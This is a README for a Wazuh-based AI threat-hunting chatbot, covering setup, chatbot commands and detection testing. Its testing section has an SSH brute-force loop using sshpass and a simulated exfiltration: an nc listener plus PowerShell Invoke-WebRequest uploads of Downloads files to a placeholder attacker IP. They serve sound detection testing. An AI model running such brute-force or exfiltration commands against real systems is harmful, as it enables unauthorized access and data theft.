# Wazuh AI Threat Hunter

A web-based AI chatbot that queries your Wazuh archive logs for threat hunting. Two approaches are provided:

| Approach | Folder | LLM Backend | Internet Required |
|---|---|---|---|
| **Ollama** (local) | `ollama/` | Llama 3 via Ollama | No — fully offline |
| **OpenRouter** (cloud) | `openrouter/` | Any OpenRouter model (default: `meta-llama/llama-3.1-8b-instruct:free`) | Yes — API key needed |

---

## Directory Structure

```
wazuh-ai-threat-hunter/
├── README.md
├── threat_hunter_ollama.py       # Ollama + FAISS vectorstore approach
└── threat_hunter_openrouter.py       # OpenRouter API approach (direct context injection)
└── requirements-openrouter.txt
```

---

## Requirements

### Infrastructure

- **Wazuh 4.12.0** central components (server, indexer, dashboard) installed on **Ubuntu 24.04**
  - Minimum **16 GB RAM** and **4 CPUs** (especially for the Ollama approach)
  - Install using the [Wazuh Quickstart Guide](https://documentation.wazuh.com/current/quickstart.html)
- At least one endpoint (Linux or Windows) with a Wazuh agent enrolled

### Enable Wazuh Archive Logs

The scripts read from `/var/ossec/logs/archives/`. You must enable archiving first:

1. Edit `/var/ossec/etc/ossec.conf` on the Wazuh server and set:
   ```xml
   <ossec_config>
     <global>
       <logall>yes</logall>
       <logall_json>yes</logall_json>
     </global>
   </ossec_config>
   ```
2. Restart the Wazuh manager:
   ```bash
   systemctl restart wazuh-manager
   ```

---

## Approach 1 — Ollama (Local, Offline)

Uses **Ollama** to run **Llama 3** locally and **FAISS** as a vectorstore for semantic log retrieval.

### Step 1 — Install Ollama

```bash
curl -fsSL https://ollama.com/install.sh | sh
```

### Step 2 — Pull the Llama 3 model

```bash
ollama pull llama3
```

> You can override the model at runtime with the `OLLAMA_MODEL` environment variable, e.g. `export OLLAMA_MODEL=llama3:70b`

### Step 3 — Install Python and dependencies

```bash
apt install python3 python3-pip -y

pip install paramiko python-daemon langchain langchain-community \
  langchain-ollama langchain-huggingface faiss-cpu \
  sentence-transformers transformers pytz \
  fastapi uvicorn "uvicorn[standard]"
```

### Step 4 — Configure credentials

Edit `ollama/threat_hunter.py` and replace the placeholders:

```python
username = "<USERNAME>"       # username to log into the chatbot UI
password = "<PASSWORD>"       # password to log into the chatbot UI
```

### Step 5 — Deploy the script

Copy the script to the Wazuh integrations directory:

```bash
cp ollama/threat_hunter.py /var/ossec/integrations/threat_hunter.py
chmod +x /var/ossec/integrations/threat_hunter.py
```

### Step 6 — Run the script

**Foreground (recommended for first run):**
```bash
python3 /var/ossec/integrations/threat_hunter.py
```

**Background (daemon mode):**
```bash
python3 /var/ossec/integrations/threat_hunter.py -d
```
Logs are written to `/var/ossec/logs/threat_hunter.log` in daemon mode.

**Expected output:**
```
INFO:     Started server process [7265]
INFO:     Waiting for application startup.
🚀 Starting FastAPI app and loading vector store...
🔄 Initializing QA chain with logs from past 7 days...
✅ 5186 logs loaded from the last 7 days.
📦 Creating vectorstore...
✅ QA chain initialized successfully.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
```

> **Note:** Initialization time depends on log volume and can take up to several minutes (or longer for very large log sets).

### Step 7 — Access the chatbot

Open a browser and go to:
```
http://<WAZUH_SERVER_IP>:8000
```

Log in with the username and password you configured in Step 4.

---

## Approach 2 — OpenRouter (Cloud API)

Uses **OpenRouter** as an LLM API gateway (supports many models including free ones). Logs are injected directly into the LLM context — no vectorstore required.

### Step 1 — Get an OpenRouter API key

Sign up at [https://openrouter.ai](https://openrouter.ai) and create a free API key.

### Step 2 — Install Python and dependencies

```bash
apt install python3 python3-pip -y

pip install paramiko python-daemon langchain langchain-openai \
  fastapi uvicorn "uvicorn[standard]"
```

### Step 3 — Set environment variables

```bash
export OPENROUTER_API_KEY="your-openrouter-api-key-here"

# Optional: override the default model (default is meta-llama/llama-3.1-8b-instruct:free)
export OPENROUTER_MODEL="meta-llama/llama-3.1-8b-instruct:free"

# Optional: tune context window size (default 400000 characters ~ 100k tokens)
export MAX_LOG_CHARS=400000
```

### Step 4 — Configure credentials

Edit `openrouter/threat_hunter.py` and replace the placeholders:

```python
username = "<USERNAME>"       # username to log into the chatbot UI
password = "<PASSWORD>"       # password to log into the chatbot UI
```

### Step 5 — Deploy the script

```bash
cp openrouter/threat_hunter.py /var/ossec/integrations/threat_hunter.py
chmod +x /var/ossec/integrations/threat_hunter.py
```

### Step 6 — Run the script

**Foreground:**
```bash
python3 /var/ossec/integrations/threat_hunter.py
```

**Background (daemon mode):**
```bash
python3 /var/ossec/integrations/threat_hunter.py -d
```

### Step 7 — Access the chatbot

```
http://<WAZUH_SERVER_IP>:8000
```

---

## Running on a Remote Server

Both scripts support reading logs from a remote Wazuh server over SSH. This lets you run the script on a separate machine.

### Step 1 — Create an SSH user on the Wazuh server

```bash
adduser <SSH_USERNAME>
usermod -aG wazuh <SSH_USERNAME>
```

### Step 2 — Configure SSH credentials in the script

Edit the chosen script and replace:

```python
ssh_username = "<SSH_USERNAME>"
ssh_password = "<SSH_PASSWORD>"
```

### Step 3 — Run with the `-H` flag pointing to the Wazuh server

```bash
python3 threat_hunter.py -H <WAZUH_SERVER_IP>
```

---

## Chatbot Commands

Once connected, you can use the following commands in the chat:

| Command | Description |
|---|---|
| `/help` | Show the help menu |
| `/reload` | Reload logs for the current date range |
| `/set days <n>` | Set the number of days of logs to load (1–365) |
| `/stat` | Show log statistics (count, date range) |

> After using `/set days`, send `/reload` to apply the change.

---

## Example Queries

```
Are there any SSH brute-force attempts against my endpoints or any suspicious SSH
events, such as multiple failed logins by valid or invalid users?
```

```
Look through the logs and identify any attempt to exfiltrate files to remote systems
using binaries such as invoke-webrequest or similar events, and provide information
about the events, such as the time it occurred and which user is responsible.
```

```
Give me a summary of the logs.
```

---

## Testing the Setup

### Simulate a Brute-Force Attack (from an Ubuntu endpoint)

Replace `<WAZUH_SERVER_IP>` with your Wazuh server IP:

```bash
username="ubuntu"
hostname="<WAZUH_SERVER_IP>"
passwords=("wrong1" "wrong2" "wrong3" "wrong4" "wrong5")
for password in "${passwords[@]}"; do
  echo "Trying $password"
  sshpass -p "$password" ssh -o StrictHostKeyChecking=no "$username@$hostname" exit 2>&1
  sleep 1
done
echo "All attempts complete."
```

### Simulate Data Exfiltration (Windows endpoint)

**1. Enable PowerShell logging** (run as Administrator):

```powershell
function Enable-PSLogging {
    $scriptBlockPath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
    $moduleLoggingPath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
    if (-not (Test-Path $scriptBlockPath)) { $null = New-Item $scriptBlockPath -Force }
    Set-ItemProperty -Path $scriptBlockPath -Name EnableScriptBlockLogging -Value 1
    if (-not (Test-Path $moduleLoggingPath)) { $null = New-Item $moduleLoggingPath -Force }
    Set-ItemProperty -Path $moduleLoggingPath -Name EnableModuleLogging -Value 1
    $moduleNames = @('*')
    Set-ItemProperty -Path $moduleLoggingPath -Name ModuleNames -Value $moduleNames
    Write-Host "Script Block Logging and Module Logging have been enabled."
}
Enable-PSLogging
```

**2. Add PowerShell log forwarding** in `C:\Program Files (x86)\ossec-agent\ossec.conf`:

```xml
<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

**3. Restart the Wazuh agent:**

```powershell
Restart-Service -Name wazuh
```

**4. Create test files and exfiltrate** (replace `<ATTACKER_IP>` and `<LISTENER_PORT>`):

On the attacker machine (Ubuntu), start a listener:
```bash
nc -lvp <LISTENER_PORT>
```

On the Windows endpoint:
```powershell
$downloads = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
1..4 | ForEach-Object { "test" | Out-File -FilePath "$downloads\test$_.txt" -Encoding utf8 }

Invoke-WebRequest -Uri "http://<ATTACKER_IP>:<LISTENER_PORT>" -Method Post -InFile "$([Environment]::GetFolderPath('UserProfile'))\Downloads\test1.txt"
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:<LISTENER_PORT>" -Method Post -InFile "$([Environment]::GetFolderPath('UserProfile'))\Downloads\test2.txt"
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:<LISTENER_PORT>" -Method Post -InFile "$([Environment]::GetFolderPath('UserProfile'))\Downloads\test3.txt"
Invoke-WebRequest -Uri "http://<ATTACKER_IP>:<LISTENER_PORT>" -Method Post -InFile "$([Environment]::GetFolderPath('UserProfile'))\Downloads\test4.txt"
```

---

## Choosing an Approach

| | Ollama | OpenRouter |
|---|---|---|
| **Privacy** | ✅ Fully local, no data leaves your server | ⚠️ Logs sent to OpenRouter API |
| **Cost** | ✅ Free (hardware cost only) | ✅ Free tier available |
| **Setup complexity** | Moderate (model download ~4 GB) | Simple (API key only) |
| **Hardware requirements** | Min 16 GB RAM, 4 CPUs | Low (API is remote) |
| **Log retrieval method** | FAISS vectorstore (semantic search) | Full context injection |
| **Supports large log sets** | ✅ Vectorstore handles scale | ⚠️ Limited by model context window |
| **Response consistency** | Good | Good |

---

## References

- [Wazuh Blog: Leveraging AI for Threat Hunting](https://wazuh.com/blog/leveraging-artificial-intelligence-for-threat-hunting-in-wazuh/)
- [Wazuh Quickstart Guide](https://documentation.wazuh.com/current/quickstart.html)
- [Wazuh Event Logging](https://documentation.wazuh.com/current/user-manual/manager/event-logging.html)
- [Ollama](https://ollama.com)
- [OpenRouter](https://openrouter.ai)
